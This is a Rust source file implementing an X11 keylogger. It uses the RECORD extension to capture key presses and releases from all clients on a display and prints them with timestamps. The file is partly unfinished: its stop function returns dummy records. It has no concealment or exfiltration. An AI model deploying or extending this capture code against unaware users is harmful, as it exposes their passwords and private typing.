include!("./keylogger.rs");

use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::thread;
use std::collections::HashMap;
use std::process::Command;
use std::str;

use x11rb::connection::Connection;
use x11rb::protocol::record::{self, ConnectionExt as _, Range8, CS};
use x11rb::protocol::xproto;
use x11rb::x11_utils::TryParse;

pub struct XKeylogger {
    exit_flag: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<u32>>,
    keymap: HashMap<u8, Vec<String>>,
}

impl XKeylogger {
    fn new() -> Result<Self, &'static str> {
        let keymap = match get_keycode_keysym_pairs() {
            Ok(map) => map,
            Err(_) => {
                log::error!("Cannot get keysym table");
                return Err("Failed to get keysym table");
            }
        };

        Ok(XKeylogger {
            exit_flag: Arc::new(AtomicBool::new(false)),
            handle: None,
            keymap
        })
    }
}

impl Keylogger for XKeylogger {
    fn record_keystrokes(&mut self) -> Result<(), &'static str>{
        if self.handle.is_some(){
            log::warn!("Cannot record keystrokes. Already recording.");
            return Err("keylogger is already recording");
        }

        self.exit_flag.store(false, Ordering::SeqCst);

        let exit_flag = Arc::clone(&self.exit_flag);
        let keymap = self.keymap.clone();
        let handle = thread::spawn(move || {
            //let con2 = XCBConnection::connect(None);
            let (conn, _) = match x11rb::connect(None) {
                Ok(val) => val,
                Err(e) => {
                    log::error!("Cannot connect to X server {:?}", e);
                    panic!();
                }
            };

            let rc = match conn.generate_id() {
                Ok(val) => val,
                Err(_) => {
                    log::error!("Cannot generate a new X identifier");
                    panic!();
                }
            };

            // setup record extension for keyboard events
            let range = record::Range {
                device_events: Range8 {
                    first: xproto::KEY_PRESS_EVENT,
                    last: xproto::KEY_RELEASE_EVENT,
                },
                ..record::Range::default()
            };

            match conn.record_create_context(rc, 0, &[CS::ALL_CLIENTS.into()], &[range]) {
                Ok(_) => (),
                Err(_) => {
                    log::error!("Cannot create record context");
                    panic!();
                }
            }

            let mut event_stream = match conn.record_enable_context(rc) {
                Ok(val) => val,
                Err(_) => {
                    log::error!("Cannot enable record context");
                    panic!();
                }
            };


            // do until exit_flag doesn't change (only changes through stop func)
            while !exit_flag.load(Ordering::SeqCst) {
                match event_stream.next() {
                    Some(Ok(reply)) => {
                        if reply.category == 0 { // Core events
                            let data = &reply.data[..];
                            if let Ok((event, _)) = xproto::KeyPressEvent::try_parse(data) {
                                //            "press"
                                //        } else {
                                //            "release"
                                //        },
                                //    )
                                //}
                                println!("[{}] {} {} {:?}",
                                    event.time,
                                    if event.response_type == xproto::KEY_PRESS_EVENT {
                                        "PRESS"
                                    } else {
                                        "RELEASE"
                                    },
                                    if let Some(keysyms) = keymap.get(&event.detail) {
                                        keysyms[0].as_str()
                                    } else {
                                        "Unknown keycode"
                                    },
                                    event.state,
                                );
                            }
                        }
                    }
                    Some(Err(e)) => {
                        println!("Error receiving event: {:?}", e);
                        break;
                    }
                    None => break,
                }

                thread::sleep(std::time::Duration::from_millis(20));
            }

            match conn.record_free_context(rc) {
                Ok(_) => (),
                Err(_) => log::error!("Cannot free context")
            };

            42
        });

        self.handle = Some(handle);
        Ok(())
    }

    fn stop(&mut self) -> Result<Vec<KeyRecord>, &'static str> {
        self.exit_flag.store(true, Ordering::Relaxed);
        let handle = match self.handle.take() {
            Some(h) => h,
            None => {
                log::warn!("Canno stop recording. Recording isn't started.");
                return Err("Not recording keystrokes");
            }
        };

        let result = handle.join();
        println!("{:?}", result);
        let k1 = KeyRecord{keycode: 1};
        let k2 = KeyRecord{keycode: 2};
        Ok(vec![k1, k2])

        //match &self.handle {
        //    None => Err("Keylogger isn't recording. Cannot stop."),
        //    Some(handle) => {
        //        let res = handle.join();
        //        println!("{:?}", res);
        //        let k1 = KeyRecord{keycode: 1};
        //        let k2 = KeyRecord{keycode: 2};
        //        self.handle = None;
        //        Ok(vec![k1, k2])
        //    }
        //}
    }
}

//fn keycode_to_keysym(conn: &impl Connection, keycode: u8, state: u16) -> Result<u32, &'static str> {
// .reply();
//    let reply = match match conn.get_keyboard_mapping(keycode, 1) {
//        Ok(map) => map,
//        Err(_) => {
//            log::warn!("Cannot get mapping for keycode {keycode}");
//            return Err("Failed to get keyboard mapping");
//        }
//    }.reply() {
//        Ok(repl) => repl,
//        Err(_) => {
//            log::warn!("Cannot get mapping reply");
//            return Err("Failed to get keyboard mapping");
//        }
//    };
//
//    let level = if (state & 0x1) != 0 { 1 } else { 0 };
//    let group = 0;
//
//    // Get keysym using XKB indexing
//    let keysyms_per_keycode = reply.keysyms_per_keycode as usize;
//    let index = (group * keysyms_per_keycode) + level;
//
//    reply.keysyms.get(index)
//        .copied()
//        .ok_or_else(|| {
//            log::warn!("Cannot get keysym");
//            "Cannot get keysym"
//        })
//}
//

fn get_keycode_keysym_pairs() -> Result<HashMap<u8, Vec<String>>, &'static str> {
    let xmodmap_output = match Command::new("xmodmap") .arg("-pke").output() {
        Ok(res) => res,
        Err(_) => {
            log::error!("Cannot execute xmodmap");
            return Err("Cannot execute xmodmap");
        }
    };

    if !xmodmap_output.status.success() {
            log::error!("xmodmap command produced an error");
            return Err("xmodmap error");
    }

    let output_str = match str::from_utf8(&xmodmap_output.stdout) {
        Ok(res) => res,
        Err(_) => {
            log::error!("Cannot convert xmodmap output to str");
            return Err("Cannot convert xmodmap output to str");
        }
    };

    let mut keymap = HashMap::new();

    for line in output_str.lines() {
        // a line looks like this:
        // keycode <8-255> = <keysym> <keysym with shift modifier> <more keysyms..>
        let parts: Vec<&str> = line.split_whitespace().collect();

        let keycode = match parts[1].parse::<u8>() {
            Ok(code) => code,
            Err(_) => continue,
        };

        let mut keysyms = Vec::new();
        for keysym in &parts[3..] {
            keysyms.push(keysym.to_string());
        }
        keymap.insert(keycode, keysyms);
    }

    Ok(keymap)
}
